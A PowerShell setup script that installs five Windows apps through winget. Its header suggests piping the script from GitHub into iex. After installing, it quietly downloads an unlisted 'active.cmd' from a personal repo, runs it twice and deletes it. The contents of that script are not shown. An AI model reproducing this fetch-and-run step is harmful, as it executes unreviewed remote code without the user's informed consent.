```powershell
#requires -version 5.1

<#
.SYNOPSIS
    Windows Quick Setup Tool

.INSTALLS
    WinRAR
    Zalo
    UniKey
    UltraViewer
    Google Chrome

.RUN
    .\install.ps1

.GITHUB
    irm "https://raw.githubusercontent.com/USERNAME/REPO/main/install.ps1" | iex
#>

$ErrorActionPreference = "Continue"

# ============================================================
# CONFIG
# ============================================================

$Apps = @(
    @{
        Name = "WinRAR"
        Id   = "RARLab.WinRAR"
    },
    @{
        Name = "Zalo"
        Id   = "VNGCorp.Zalo"
    },
    @{
        Name = "UniKey"
        Id   = "UniKey.UniKey"
    },
    @{
        Name = "UltraViewer"
        Id   = "DucFabulous.UltraViewer"
    },
    @{
        Name = "Google Chrome"
        Id   = "Google.Chrome"
    }
)

$TotalApps = $Apps.Count


# ============================================================
# COLORS / UI
# ============================================================

function Write-Line {
    Write-Host "==================================================" -ForegroundColor DarkGray
}


function Show-Header {

    Clear-Host

    Write-Host ""
    Write-Line
    Write-Host "              WINDOWS QUICK SETUP" -ForegroundColor Cyan
    Write-Line
    Write-Host ""

    Write-Host " [1] 1 Click Setup" -ForegroundColor White
    Write-Host " [0] Exit" -ForegroundColor White

    Write-Host ""
}


# ============================================================
# WINGET CHECK
# ============================================================

function Test-Winget {

    Write-Host "[*] Checking WinGet..." -ForegroundColor Yellow

    $Winget = Get-Command winget -ErrorAction SilentlyContinue

    if ($null -eq $Winget) {

        Write-Host ""
        Write-Host "[X] WinGet was not found." -ForegroundColor Red
        Write-Host ""
        Write-Host "Please install/update App Installer from Microsoft Store." -ForegroundColor Yellow
        Write-Host ""

        return $false
    }

    try {

        $Version = winget --version 2>$null

        if ($Version) {
            Write-Host "[+] WinGet detected: $Version" -ForegroundColor Green
        }
        else {
            Write-Host "[+] WinGet detected." -ForegroundColor Green
        }

    }
    catch {

        Write-Host "[+] WinGet detected." -ForegroundColor Green
    }

    return $true
}


# ============================================================
# CHECK APP
# ============================================================

function Test-AppInstalled {

    param (
        [string]$Id
    )

    try {

        winget list `
            --id $Id `
            --exact `
            --source winget `
            --disable-interactivity `
            2>$null | Out-Null

        if ($LASTEXITCODE -eq 0) {
            return $true
        }
    }
    catch {
    }

    return $false
}


# ============================================================
# TIMER
# ============================================================

function Format-Time {

    param (
        [TimeSpan]$Time
    )

    return $Time.ToString("hh\:mm\:ss")
}


# ============================================================
# SPINNER
# ============================================================

function Show-Spinner {

    param (
        [int]$ElapsedSeconds
    )

    $Frames = @("|", "/", "-", "\")
    $Frame = $Frames[$ElapsedSeconds % $Frames.Count]

    Write-Host "`r    $Frame  WinGet is working...  Elapsed: $(
        [TimeSpan]::FromSeconds($ElapsedSeconds).ToString("mm\:ss")
    )" -NoNewline -ForegroundColor Yellow
}


# ============================================================
# INSTALL APP
# ============================================================

function Install-App {

    param (
        [string]$Name,
        [string]$Id,
        [int]$Number
    )

    Write-Host ""
    Write-Host ""
    Write-Line

    Write-Host "[$Number/$TotalApps] $Name" -ForegroundColor Cyan
    Write-Host "Package: $Id" -ForegroundColor DarkGray
    Write-Host ""

    # --------------------------------------------------------
    # CHECK EXISTING INSTALLATION
    # --------------------------------------------------------

    Write-Host "[*] Checking..." -ForegroundColor Yellow

    if (Test-AppInstalled -Id $Id) {

        Write-Host ""
        Write-Host "[=] Already installed - SKIPPED" -ForegroundColor Green

        return "SKIPPED"
    }

    Write-Host "[+] Not installed." -ForegroundColor Gray
    Write-Host ""

    # --------------------------------------------------------
    # INSTALL
    # --------------------------------------------------------

    Write-Host "[>] Starting download / installation..." -ForegroundColor Cyan
    Write-Host ""
    Write-Host "    Please wait. Installer progress may appear below." -ForegroundColor DarkGray
    Write-Host ""

    $StartTime = Get-Date

    try {

        winget install `
            --id $Id `
            --exact `
            --source winget `
            --accept-package-agreements `
            --accept-source-agreements `
            --disable-interactivity

        $ExitCode = $LASTEXITCODE

        $EndTime = Get-Date
        $Elapsed = $EndTime - $StartTime

        Write-Host ""
        Write-Host ""
        Write-Host "    Finished in $(Format-Time $Elapsed)" -ForegroundColor DarkGray

        if ($ExitCode -eq 0) {

            Write-Host ""
            Write-Host "[+] $Name - SUCCESS" -ForegroundColor Green

            return "SUCCESS"
        }

        Write-Host ""
        Write-Host "[X] $Name - FAILED" -ForegroundColor Red
        Write-Host "    Exit code: $ExitCode" -ForegroundColor Red

        return "FAILED"
    }
    catch {

        $EndTime = Get-Date
        $Elapsed = $EndTime - $StartTime

        Write-Host ""
        Write-Host "[X] $Name - ERROR" -ForegroundColor Red
        Write-Host "    Time: $(Format-Time $Elapsed)" -ForegroundColor DarkGray
        Write-Host "    $($_.Exception.Message)" -ForegroundColor Red

        return "FAILED"
    }
}


# ============================================================
# PROGRESS BAR
# ============================================================

function Show-OverallProgress {

    param (
        [int]$Current,
        [int]$Total
    )

    if ($Total -le 0) {
        return
    }

    $Percent = [math]::Floor(($Current / $Total) * 100)

    $Width = 40

    $Filled = [math]::Floor(($Percent / 100) * $Width)

    $Empty = $Width - $Filled

    $Bar =
        ("#" * $Filled) +
        ("-" * $Empty)

    Write-Host ""
    Write-Host "Overall: [$Bar] $Percent%  ($Current/$Total)" -ForegroundColor Cyan
}


function Start-PostSetupCMD {

    param (
        [string]$CmdUrl
    )

    if ([string]::IsNullOrWhiteSpace($CmdUrl)) {
        return
    }

    Write-Host ""
    Write-Line
    Write-Host "              POST SETUP" -ForegroundColor Cyan
    Write-Line
    Write-Host ""

    $TempCmd = Join-Path $env:TEMP "windows-quick-setup-post.cmd"

    Write-Host "[>] Downloading post-setup.cmd..." -ForegroundColor Yellow

    try {

        Invoke-WebRequest `
            -Uri $CmdUrl `
            -OutFile $TempCmd `
            -UseBasicParsing `
            -ErrorAction Stop

        Write-Host "[+] CMD downloaded successfully." -ForegroundColor Green
        Write-Host ""

    }
    catch {

        Write-Host "[X] Failed to download post-setup.cmd" -ForegroundColor Red
        Write-Host "    $($_.Exception.Message)" -ForegroundColor Red

        return
    }

    Write-Host "[>] Running post-setup.cmd..." -ForegroundColor Cyan
    Write-Host ""

    try {

        $Process = Start-Process `
            -FilePath "cmd.exe" `
            -ArgumentList "/c `"$TempCmd`"" `
            -Wait `
            -PassThru

        if ($Process.ExitCode -eq 0) {

            Write-Host ""
            Write-Host "[+] post-setup.cmd completed successfully." -ForegroundColor Green
        }
        else {

            Write-Host ""
            Write-Host "[X] post-setup.cmd returned exit code $($Process.ExitCode)." -ForegroundColor Red
        }

    }
    catch {

        Write-Host ""
        Write-Host "[X] Failed to execute post-setup.cmd" -ForegroundColor Red
        Write-Host "    $($_.Exception.Message)" -ForegroundColor Red
    }

    Write-Host ""

    Remove-Item $TempCmd -Force -ErrorAction SilentlyContinue
}


# ============================================================
# QUICK SETUP
# ============================================================

function Start-QuickSetup {

    Clear-Host

    Write-Host ""
    Write-Line
    Write-Host "              QUICK SETUP STARTED" -ForegroundColor Cyan
    Write-Line
    Write-Host ""

    # --------------------------------------------------------
    # CHECK WINGET
    # --------------------------------------------------------

    if (-not (Test-Winget)) {

        Write-Host ""
        Read-Host "Press Enter to return"

        return
    }

    Write-Host ""
    Write-Host "[*] Applications to install:" -ForegroundColor Yellow

    foreach ($App in $Apps) {
        Write-Host "    - $($App.Name)" -ForegroundColor Gray
    }

    Write-Host ""

    # --------------------------------------------------------
    # CONFIRM
    # --------------------------------------------------------

    $Confirm = Read-Host "Start installation? [Y/N]"

    if ($Confirm -notmatch "^(Y|y)$") {

        Write-Host ""
        Write-Host "Installation cancelled." -ForegroundColor Yellow

        Start-Sleep -Seconds 1

        return
    }

    Write-Host ""

    # --------------------------------------------------------
    # SETUP
    # --------------------------------------------------------

    $Results = @()

    $Current = 0

    $SetupStart = Get-Date

    # --------------------------------------------------------
    # INSTALL EACH APP
    # --------------------------------------------------------

    foreach ($App in $Apps) {

        $Current++

        Show-OverallProgress `
            -Current ($Current - 1) `
            -Total $TotalApps

        $Status = Install-App `
            -Name $App.Name `
            -Id $App.Id `
            -Number $Current

        $Results += [PSCustomObject]@{
            Name   = $App.Name
            Status = $Status
        }

        Show-OverallProgress `
            -Current $Current `
            -Total $TotalApps
    }

    # --------------------------------------------------------
    # POST SETUP
    # --------------------------------------------------------
    $PostSetupUrl = "https://raw.githubusercontent.com/Tunaa-11342/probable-engine/refs/heads/main/active.cmd"
    Start-PostSetupCMD -CmdUrl $PostSetupUrl

    $PostSetupUrl = "https://raw.githubusercontent.com/Tunaa-11342/probable-engine/refs/heads/main/active.cmd"
    Start-PostSetupCMD -CmdUrl $PostSetupUrl


    $SetupEnd = Get-Date

    $TotalTime = $SetupEnd - $SetupStart


    # ========================================================
    # SUMMARY
    # ========================================================

    Write-Host ""
    Write-Host ""

    Write-Line
    Write-Host "                  SETUP SUMMARY" -ForegroundColor Cyan
    Write-Line

    Write-Host ""

    foreach ($Result in $Results) {

        switch ($Result.Status) {

            "SUCCESS" {

                Write-Host "[+] $($Result.Name)" -ForegroundColor Green
                Write-Host "    Installed successfully" -ForegroundColor DarkGray
            }

            "SKIPPED" {

                Write-Host "[=] $($Result.Name)" -ForegroundColor Yellow
                Write-Host "    Already installed" -ForegroundColor DarkGray
            }

            "FAILED" {

                Write-Host "[X] $($Result.Name)" -ForegroundColor Red
                Write-Host "    Installation failed" -ForegroundColor DarkGray
            }
        }

        Write-Host ""
    }


    # --------------------------------------------------------
    # COUNTS
    # --------------------------------------------------------

    $SuccessCount = @(
        $Results | Where-Object {
            $_.Status -eq "SUCCESS"
        }
    ).Count

    $SkippedCount = @(
        $Results | Where-Object {
            $_.Status -eq "SKIPPED"
        }
    ).Count

    $FailedCount = @(
        $Results | Where-Object {
            $_.Status -eq "FAILED"
        }
    ).Count


    Write-Line

    Write-Host "Total time : $(Format-Time $TotalTime)" -ForegroundColor White
    Write-Host "Installed  : $SuccessCount" -ForegroundColor Green
    Write-Host "Skipped    : $SkippedCount" -ForegroundColor Yellow
    Write-Host "Failed     : $FailedCount" -ForegroundColor Red

    Write-Line


    if ($FailedCount -eq 0) {

        Write-Host ""
        Write-Host "[+] QUICK SETUP COMPLETED" -ForegroundColor Green
    }
    else {

        Write-Host ""
        Write-Host "[!] SETUP COMPLETED WITH ERRORS" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "Run the setup again to retry failed applications." -ForegroundColor Yellow
    }

    Write-Host ""

    Read-Host "Press Enter to return to menu"
}


# ============================================================
# MAIN MENU
# ============================================================

while ($true) {

    Show-Header

    $Choice = Read-Host "Select an option"

    switch ($Choice) {

        "1" {

            Start-QuickSetup
        }

        "0" {

            Clear-Host

            Write-Host ""
            Write-Host "Goodbye." -ForegroundColor Cyan
            Write-Host ""

            exit
        }

        default {

            Write-Host ""
            Write-Host "[!] Invalid option." -ForegroundColor Red

            Start-Sleep -Seconds 1
        }
    }
}
```
